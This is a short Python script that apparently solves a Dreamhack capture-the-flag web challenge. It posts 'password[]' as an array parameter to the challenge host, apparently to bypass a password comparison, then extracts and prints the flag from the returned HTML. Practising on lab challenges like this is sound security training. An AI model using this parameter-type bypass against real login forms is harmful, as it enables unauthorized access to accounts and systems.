from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:17611"
PAYLOAD = {'password[]': 'a'}

resp = requests.post(URL, data=PAYLOAD)

soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('b')
flag = pre.contents[0]
print(flag)